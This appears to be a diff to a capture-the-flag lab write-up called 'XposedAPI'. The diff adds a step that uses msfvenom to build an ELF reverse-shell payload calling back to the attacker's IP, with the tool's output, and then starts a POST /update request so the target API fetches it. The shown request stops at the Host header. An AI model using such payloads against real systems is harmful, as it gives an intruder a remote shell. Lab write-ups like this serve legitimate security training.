@@ -1,4 +1,4 @@
-##### Tags: `wget`  `web enum`  `API`  `SUID`  `add new user`
+##### Tags: `wget`  `web enum`  `API`  `SUID`  `add new user`  `elf`
 
 # 🐧XposedAPI🐧
 ## Enumeration
@@ -51,7 +51,18 @@ root:x:0:0:root:/root:/bin/bash
 clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
 ```
 since we have username  
-the plan is create a elf revershell for the api to download and restart to execute it
+the plan is create a elf revershell for the api to download and restart to execute it  
+elf reverse shell
+```console
+$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.217 LPORT=22 -f elf -o reverse.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+Saved as: reverse.elf
+```
+downlaod from our machine
 ```console
 POST /update HTTP/1.1
 Host: 192.168.195.134:13337
